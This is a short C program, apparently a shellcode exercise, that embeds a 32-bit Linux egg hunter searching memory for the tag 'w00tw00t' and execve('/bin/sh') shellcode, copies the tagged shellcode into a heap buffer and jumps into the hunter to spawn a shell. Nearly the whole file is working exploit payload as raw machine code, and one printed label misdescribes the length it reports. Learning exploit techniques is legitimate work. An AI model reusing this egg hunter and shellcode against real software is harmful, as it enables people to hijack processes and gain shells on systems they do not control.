#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Hunting for w00tw00t
unsigned char eggHunter[] = \
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80"
"\x3c\xf2\x74\xed\x81\x3a\x77\x30\x30\x74\x75\xea\x81\x7a\x04\x77\x30\x30\x74"
"\x75\xe1\x83\xc2\x08\xff\xe2";

unsigned char egg[] = "\x77\x30\x30\x74"; // w00t

unsigned char shellcode[] = \ // execve("/bin/sh", NULL, NULL); 
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() {
  int eggSize = strlen(egg);
  int shellcodeSize = strlen(shellcode);
  unsigned char* eggie = malloc((eggSize * 2) + shellcodeSize);

  memcpy(eggie, egg, eggSize);
  memcpy(&eggie[eggSize], egg, eggSize);
  memcpy(&eggie[eggSize * 2], shellcode, shellcodeSize);

  printf("Egg Hunter Length: %d\n", strlen(eggHunter));
  printf("Egg + Shellcode Length:  %d\n", strlen(shellcode));

  int (*ret)() = (int(*)())eggHunter;

  ret();
}
